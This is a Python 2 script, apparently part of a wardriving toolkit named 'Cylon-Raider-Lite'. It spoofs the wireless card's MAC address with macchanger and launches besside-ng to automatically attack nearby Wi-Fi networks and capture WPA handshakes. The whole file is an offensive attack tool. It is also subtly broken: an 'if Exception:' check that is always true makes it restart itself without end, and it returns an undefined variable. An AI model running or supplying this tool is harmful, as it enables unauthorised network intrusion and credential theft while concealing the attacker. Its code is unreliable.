import os
import sys
import socket
import operator
import subprocess
import time
import re

def start_besside(str_interface_selected):

    # BUGFIX. Besside-ng fails to continually save more WPA handshakes if a wpa.cap file exists
    # The fix is to rename the original file with a unique timestr in the same directory so Besside-ng has another wpa.cap file it generates to work with.
    timestr = time.strftime("%Y%m%d-%H%M%S")
    os.chdir('/root/Cylon-Raider-Lite/logs/wardriver_xpress')
    # terminate interfering programs
    cmd_str = """
    mv ./wpa.cap ./wpa.cap.save.{1}.cap
    ifconfig {0} down
    macchanger -r -b {0}
    ifconfig {0} up
    """.format(str_interface_selected, timestr)
    print """

    #####################################
    SWAPPING BURNED-IN MAC ADDR
                &
    RESTARTING NETWORK INTERFACE: %s
    #####################################

    """ % str_interface_selected
    os.system(cmd_str)
    # then run besside-ng
    cmd_str = "besside-ng -W %s" % str_interface_selected
    # os.system(cmd_str)
    with open('test.log', 'w') as f:
        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE)
        for c in iter(lambda: proc.stdout.read(1), ''):
            sys.stdout.write(c)
            f.write(c)
    if Exception:
        print """
        ##########################

        EXCEPTION DETECTED
        RESTARTING BESSIDE-NG

        ##########################
        """
        start_besside(str_interface_selected)
    else:
        os.system('clear')
        print """
        #############################

        STARTUP SUCCESSFUL
        PROCEEDING TO ATTACK NETWORKS

        #############################

        """
        for line in iter(proc.stdout.readline, ''):
            sys.stdout.write(line)
            f.write(line)

    return rc
def grep_network_interfaces():
    list_interfaces = []
    dict_interfaces = {}
    cmd_search = "ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'"
    proc = subprocess.Popen(cmd_search, shell=True, stdout=subprocess.PIPE)
    interface_results = proc.stdout.read()

    list_interfaces = interface_results.replace('\n','').split(':')
    print "SELECT YOUR INTERFACE"
    print list_interfaces
    counter = 0
    for item in list_interfaces:
        if item != '':
            counter += 1
            dict_interfaces[counter] = item
    print dict_interfaces


    # print list_interfaces
    str_interface_selected = int(raw_input("Enter the number of the NETWORK CARD/INTERFACE you want to use: "))
    str_interface_selected = dict_interfaces[str_interface_selected]
    print """

    #####################################
    Selected: %s
    #####################################

    """ % str_interface_selected
    start_besside(str_interface_selected)
    return str_interface_selected, interface_results
def main():

    print """
    0: Return to main menu
    1: Start Wardriver Mode + besside-ng + macchanger (burned in address change)

    """

    opt_choice = int(raw_input("Enter a OPTION: "))

    if opt_choice == 1:
        grep_network_interfaces()
    elif opt_choice == 0:
        os.system('python /root/Cylon-Raider-Lite/Cylon_Raider_Main.py')
    else:
        print 'You have entered a invalid option'
        main()
    return
main()
